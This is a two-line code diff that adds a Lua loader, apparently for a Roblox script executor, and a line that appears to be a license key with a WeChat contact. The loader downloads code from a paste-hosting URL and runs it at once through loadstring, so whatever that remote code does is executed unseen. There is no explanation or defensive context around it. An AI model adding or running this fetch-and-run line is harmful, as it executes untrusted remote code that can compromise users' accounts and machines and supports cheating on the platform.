@@ -1,0 +1,2 @@
+loadstring(game:HttpGet("https://pastefy.app/bWRr3pM6/raw"))()
+卡密WX_1q64jf
